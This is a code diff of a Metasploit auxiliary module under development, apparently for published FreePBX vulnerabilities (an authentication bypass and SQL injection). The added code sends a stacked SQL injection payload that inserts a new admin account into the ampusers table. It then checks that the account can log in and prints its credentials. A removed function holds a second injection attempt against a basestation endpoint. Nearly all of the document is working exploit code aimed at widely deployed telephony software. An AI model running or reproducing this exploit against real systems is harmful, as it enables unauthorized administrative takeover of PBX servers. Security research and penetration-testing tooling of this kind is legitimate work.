@@ -11,40 +11,79 @@ class MetasploitModule < Msf::Auxiliary
     super(
       update_info(
         info,
-        'Name' => 'Sample Auxiliary Module',
-
-        'Description' => 'Sample Auxiliary Module',
-        'Author' => ['Joe Module <joem@example.com>'],
+        'Name' => 'FreePBX Custom Extension SQL Injection',
+        'Description' => 'TODO',
+        'Author' => [
+          'Noah King', # research
+          'msutovsky-r7', # module
+        ],
         'License' => MSF_LICENSE,
-        # https://docs.metasploit.com/docs/development/developing-modules/module-metadata/definition-of-module-reliability-side-effects-and-stability.html
+        'References' => [
+          [ 'CVE', '2025-66039'], # Authentication Bypass
+          [ 'CVE', '2025-61675']  # SQL injections
+        ],
         'Notes' => {
           'Stability' => [],
           'Reliability' => [],
           'SideEffects' => []
-        },
-        'DefaultAction' => 'Default Action'
+        }
       )
     )
     register_options([
       OptString.new('USERNAME', [true, 'The valid FreePBX user', 'admin']),
       OptString.new('FAKE_USERNAME', [false, 'Username for inserted user']),
       OptString.new('FAKE_PASSWORD', [false, 'Password for inserted user']),
-
     ])
+  end
+
+  def get_referer
+    protocol = ssl ? 'https' : 'http'
+
+    return "#{protocol}://#{datastore['rhosts']}" if rport == 80
+
+    "#{protocol}://#{datastore['rhosts']}:#{datastore['rport']}"
   end
 
   def run
     username = datastore['FAKE_USERNAME'] || Rex::Text.rand_text_alphanumeric(rand(4..10))
     password = datastore['FAKE_PASSWORD'] || Rex::Text.rand_text_alphanumeric(rand(6..12))
-    password = Digest::SHA1.hexdigest(password)
 
-    custom_extension_injection(username, password)
-    # basestation_injection(username,password)
+    print_status('Trying to create new fake user')
+    res = custom_extension_injection(username, Digest::SHA1.hexdigest(password))
+
+    fail_with(Failure::PayloadFailed, 'Failed to create fake user') unless res&.code == 401
+
+    if valid_creds?(username, password)
+      print_good("New admin account: #{username}/#{password}")
+    else
+      print_error('Failed to create new user')
+    end
   end
 
-  def sql_firmare_injection; end
+  def valid_creds?(username, password)
+    res = send_request_cgi({
+      'uri' => normalize_uri('admin', 'ajax.php'),
+      'method' => 'POST',
+      'vars_get' => {
+        'module' => 'userman',
+        'command' => 'checkPasswordReminder'
+      },
+      'headers' => { Referer: "#{get_referer}/admin/config.php" },
+      'vars_post' => {
+        'username' => username,
+        'password' => Rex::Text.encode_base64(password),
+        'loginpanel' => 'admin'
+      }
+    })
 
-  def model_basefile_injection; end
+    return false unless res&.code == 200
+
+    json_data = res.get_json_document
+
+    return false unless json_data['status'] == true && json_data['message'] == '' && json_data['usertype'] == 'admin'
+
+    true
+  end
 
   def custom_extension_injection(username, password)
     send_request_cgi({
@@ -59,40 +98,6 @@ class MetasploitModule < Msf::Auxiliary
       },
       'vars_post' => {
         'id' => %<1';INSERT INTO ampusers (username, password_sha1, sections) VALUES ('#{username}', '#{password}', 0x2a)#>
-      }
-    })
-  end
-
-  def basestation_injection(_username, _password)
-    send_request_cgi({
-      'uri' => normalize_uri('admin', 'config.php'),
-      'method' => 'POST',
-      'headers' => {
-        'Authorization' => basic_auth(datastore['USERNAME'], Rex::Text.rand_text_alphanumeric(6)),
-        'Referer' => 'http://192.168.168.223/admin/config.php?display=endpoint&new=1&view=basestation'
-      },
-      'vars_get' => {
-        'display' => 'endpoint',
-        'new' => 1,
-        'view' => 'basestation'
-      },
-      'vars_post' => {
-        'id' => '',
-        'name' => %(1';SELECT * FROM ampusers WHERE ''='),
-        'brand' => 'Sangoma',
-        'template' => 'sangoma_default',
-        'mac' => '7a%3A29%3A78%3A0a%3Ae9%3A4b',
-        'ac' => 1231,
-        'repeater1' => '',
-        'repeater2' => '',
-        'repeater3' => '',
-        'multicell' => 'no',
-        'sync_chain_id' => 512,
-        'sync_time' => 60,
-        'sync_data_transport' => 'multicast',
-        'primary_data_sync_ip' => '0.0.0.0',
-        'sync_debug_enable' => 0,
-        'action' => 'save_basestation'
       }
     })
   end
